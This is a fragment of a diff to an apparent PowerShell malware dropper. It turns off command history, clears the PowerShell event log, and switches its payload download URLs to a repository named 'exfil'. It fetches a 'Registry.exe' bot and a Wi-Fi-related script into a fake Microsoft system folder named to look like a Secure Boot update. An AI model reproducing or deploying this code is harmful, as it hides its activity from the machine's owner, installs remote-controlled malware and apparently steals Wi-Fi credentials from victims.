@@ -16,8 +16,8 @@ Set-PSReadLineOption -HistorySaveStyle SaveNothing | Out-Null
 Clear-EventLog "Windows Powershell"
 $LogEngineLifecycleEvent = $false | Out-Null
 [void]$LogEngineLifecycleEvent
-$boturl = "https://codeberg.org/sempiampi/mavericks/releases/download/v1.0.0/Registry.exe"
-$squidurl = "https://codeberg.org/sempiampi/mavericks/raw/branch/main/WifiRelated/WifiSquid.ps1"
+$boturl = "https://github.com/sempiampi/exfil/releases/download/1.0.0/Registry.exe"
+$squidurl = "https://raw.githubusercontent.com/sempiampi/exfil/refs/heads/main/WifiRelated/WifiSquid.ps1"
 $basepath = "C:\Windows\System32\SecureBootUpdatesMicrosoft"
 $botpath = Join-Path -Path $basepath -ChildPath "Registry.exe"
 $squidpath = Join-Path -Path $basepath -ChildPath "SquidReaper.ps1"
